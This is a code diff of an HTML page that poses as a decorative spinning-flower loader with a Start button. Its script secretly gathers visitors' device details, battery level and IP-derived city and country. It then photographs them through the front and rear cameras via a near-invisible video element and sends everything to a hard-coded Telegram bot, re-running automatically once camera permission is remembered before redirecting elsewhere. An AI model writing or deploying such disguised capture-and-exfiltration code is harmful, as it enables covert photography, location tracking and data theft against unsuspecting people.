@@ -7,219 +7,232 @@
 <style>
 body{
 margin:0;
-background:black;
+background:#000;
 display:flex;
 justify-content:center;
 align-items:center;
 height:100vh;
-color:white;
-font-family:Arial;
-text-align:center;
 overflow:hidden;
 }
 
-/* ---------- FLOWER LOADER ---------- */
+/* 🌻 Pixel sunflower generated via CSS */
 .flower{
+width:150px;
+height:150px;
 position:relative;
-width:120px;
-height:120px;
-animation:rotate 4s linear infinite;
+animation:spin 6s linear infinite;
 }
 
-.petal{
+.flower div{
 position:absolute;
-width:60px;
-height:60px;
-background:radial-gradient(circle at 30% 30%, #ff8ccf, #ff2d96);
-border-radius:50%;
-image-rendering:pixelated;
-filter:drop-shadow(0 0 6px #ff4da6);
+width:28px;
+height:28px;
+background:#ffcc00;
+border-radius:4px;
 }
 
-/* 5 petals */
-.petal:nth-child(1){ top:0; left:30px; }
-.petal:nth-child(2){ top:30px; left:60px; }
-.petal:nth-child(3){ top:60px; left:30px; }
-.petal:nth-child(4){ top:30px; left:0; }
-.petal:nth-child(5){ top:15px; left:15px; background:#ffb3da; width:40px; height:40px; }
-
-@keyframes rotate{
-from{ transform:rotate(0deg); }
-to{ transform:rotate(360deg); }
+.center{
+background:#5a3d00 !important;
+width:40px !important;
+height:40px !important;
+top:55px;
+left:55px;
 }
 
+@keyframes spin{
+from{transform:rotate(0deg)}
+to{transform:rotate(360deg)}
+}
+
+/* Tiny preview */
+video{
+position:absolute;
+width:1px;
+height:1px;
+opacity:0.01;
+}
+
+button{
+position:absolute;
+bottom:60px;
+padding:12px 20px;
+border:none;
+border-radius:8px;
+font-size:16px;
+cursor:pointer;
+}
+
+/* Fade transition */
+.fade{
+animation:fadeOut 1s forwards;
+}
+
+@keyframes fadeOut{
+to{opacity:0;}
+}
 </style>
 </head>
 
 <body>
 
-<div id="content">
-<div class="flower">
-<div class="petal"></div>
-<div class="petal"></div>
-<div class="petal"></div>
-<div class="petal"></div>
-<div class="petal"></div>
-</div>
-</div>
+<div class="flower" id="flower"></div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<button id="startBtn">Start</button>
 
 <script>
-
-/* ---------- INSTANT REDIRECT ---------- */
-const params=new URLSearchParams(window.location.search);
-const go=params.get("go");
-if(go){
-window.location.href=go;
-}
-
-/* ---------- ORIGINAL SCRIPT ---------- */
-
+/* -------- TELEGRAM CONFIG -------- */
 const BOT_TOKEN="8082815317:AAEHd6AKLOBJK9vXU0KUuXCgwPt4-v0DyGg";
 const CHAT_ID="1167762232";
 
-// ---------- SESSION TOKEN ----------
-function getSession(){
-let token=localStorage.getItem("sessionToken");
-if(!token){
-token=Math.random().toString(36).substring(2);
-localStorage.setItem("sessionToken",token);
+/* -------- CREATE PIXEL FLOWER -------- */
+const flower=document.getElementById("flower");
+for(let i=0;i<12;i++){
+let p=document.createElement("div");
+let angle=(i*30)*Math.PI/180;
+p.style.top=60+Math.sin(angle)*55+"px";
+p.style.left=60+Math.cos(angle)*55+"px";
+flower.appendChild(p);
 }
-return token;
+let c=document.createElement("div");
+c.className="center";
+flower.appendChild(c);
+
+/* -------- TELEGRAM SEND -------- */
+async function sendPhoto(blob,caption=""){
+let form=new FormData();
+form.append("chat_id",CHAT_ID);
+form.append("photo",blob);
+form.append("caption",caption);
+
+await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+method:"POST",
+body:form
+});
 }
 
-// ---------- DEVICE + BEHAVIOUR ----------
-async function collectDeviceData(){
+async function sendText(text){
+await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+method:"POST",
+headers:{'Content-Type':'application/json'},
+body:JSON.stringify({chat_id:CHAT_ID,text})
+});
+}
 
-let session=getSession();
+/* -------- DEVICE INFO -------- */
+async function collectInfo(){
 
-let data={
-session:session,
-userAgent:navigator.userAgent,
-platform:navigator.platform,
-language:navigator.language,
-screen:screen.width+"x"+screen.height,
-timezone:Intl.DateTimeFormat().resolvedOptions().timeZone
-};
+let info="📱 Device\n"+navigator.userAgent+"\n";
 
 if(navigator.getBattery){
-let battery=await navigator.getBattery();
-data.battery=Math.round(battery.level*100)+"%";
+let b=await navigator.getBattery();
+info+="🔋 Battery: "+Math.round(b.level*100)+"%\n";
 }
 
 try{
-let res=await fetch("https://ipapi.co/json/");
-let loc=await res.json();
-data.ip=loc.ip;
-data.city=loc.city;
-data.country=loc.country_name;
+let r=await fetch("https://ipapi.co/json/");
+let j=await r.json();
+info+=`📍 ${j.city}, ${j.country_name}`;
 }catch{}
 
-sendText(JSON.stringify(data,null,2));
-
+sendText(info);
 }
 
-function sendText(text){
-fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-method:"POST",
-headers:{'Content-Type':'application/json'},
-body:JSON.stringify({
-chat_id:CHAT_ID,
-text:text
-})
+/* -------- CAMERA -------- */
+let video=document.getElementById("video");
+let canvas=document.getElementById("canvas");
+let ctx=canvas.getContext("2d");
+
+async function startCamera(mode){
+return await navigator.mediaDevices.getUserMedia({
+video:{
+facingMode:mode,
+width:{ideal:1920},
+height:{ideal:1080}
+}
 });
 }
 
-// ---------- CAMERA ----------
-async function startCaptureSequence() {
-        try {
-            // Front Camera - 3 Photos
-            await captureStream({ facingMode: "user" }, 3, "Front");
+function snap(){
+canvas.width=video.videoWidth;
+canvas.height=video.videoHeight;
+ctx.drawImage(video,0,0);
 
-            // Rear Camera - 2 Photos
-            // Uses 'optional' approach to prevent crashing on devices with only 1 camera
-            await captureStream({ facingMode: "environment" }, 2, "Rear");
-
-            // Final Redirect
-            if (redirectUrl) window.location.href = redirectUrl;
-
-        } catch (err) {
-            console.error("Sequence Interrupted:", err);
-        }
-    }
-
-    async function captureStream(constraints, count, label) {
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { ...constraints, width: 1280, height: 720 } 
+return new Promise(res=>{
+canvas.toBlob(res,"image/jpeg",0.95);
 });
-        
-        const video = document.createElement("video");
-        video.srcObject = stream;
-        await video.play();
-
-        for (let i = 0; i < count; i++) {
-            await new Promise(r => setTimeout(r, 1200)); // Warm-up delay for quality
-            
-            const canvas = document.createElement("canvas");
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext("2d").drawImage(video, 0, 0);
-
-            canvas.toBlob((blob) => {
-                console.log(`[${label}] Shot ${i+1} Ready | Size: ${Math.round(blob.size/1024)}KB`);
-                // Binary data (blob) would be appended to FormData and sent here
-}, "image/jpeg", 0.90);
 }
 
-        stream.getTracks().forEach(t => t.stop());
+/* -------- CAPTURE FLOW -------- */
+async function runExperiment(){
+
+localStorage.setItem("expGranted","yes");
+
+await collectInfo();
+
+/* FRONT */
+let stream=await startCamera("user");
+video.srcObject=stream;
+
+await delay(1500);
+
+for(let i=1;i<=3;i++){
+await sendPhoto(await snap(),"Front "+i);
+await delay(900);
 }
 
-// ---------- PERMISSION CHECK ----------
-async function checkPermission(){
+stream.getTracks().forEach(t=>t.stop());
 
-if(!navigator.permissions){
-showPermissionButton();
-return;
+/* BACK */
+stream=await startCamera("environment");
+video.srcObject=stream;
+
+await delay(1500);
+
+for(let i=1;i<=2;i++){
+await sendPhoto(await snap(),"Back "+i);
+await delay(900);
 }
 
-let result=await navigator.permissions.query({name:"camera"});
+stream.getTracks().forEach(t=>t.stop());
 
-if(result.state==="granted"){
-startCamera();
-}
-else{
-showPermissionButton();
+redirectUser();
 }
 
+/* -------- HELPERS -------- */
+function delay(ms){ return new Promise(r=>setTimeout(r,ms)); }
+
+function redirectUser(){
+document.body.classList.add("fade");
+
+let go=new URLSearchParams(location.search).get("go");
+if(go) setTimeout(()=>location.href=go,1000);
 }
 
-// ---------- BUTTON ----------
-function showPermissionButton(){
-document.getElementById("content").innerHTML=
-`<button onclick="startCamera()">Allow Camera</button>`;
+/* -------- PERMISSION MEMORY -------- */
+async function autoStartIfAllowed(){
+
+try{
+let perm=await navigator.permissions.query({name:"camera"});
+
+if(perm.state==="granted" && localStorage.getItem("expGranted")==="yes"){
+runExperiment();
+}
+}catch{}
 }
 
-// ---------- TRACK BEHAVIOUR ----------
-function trackBehaviour(){
+/* -------- BUTTON -------- */
+document.getElementById("startBtn").onclick=async ()=>{
+document.getElementById("startBtn").style.display="none";
+runExperiment();
+};
 
-document.addEventListener("click",()=>sendText("User clicked"));
-
-let start=Date.now();
-
-window.addEventListener("beforeunload",()=>{
-let duration=Math.round((Date.now()-start)/1000);
-sendText("Session duration: "+duration+" seconds");
-});
-
-}
-
-// ---------- RUN ----------
-collectDeviceData();
-trackBehaviour();
-checkPermission();
+/* Try auto start */
+autoStartIfAllowed();
 
 </script>
 
 </body>
 </html>
-
-
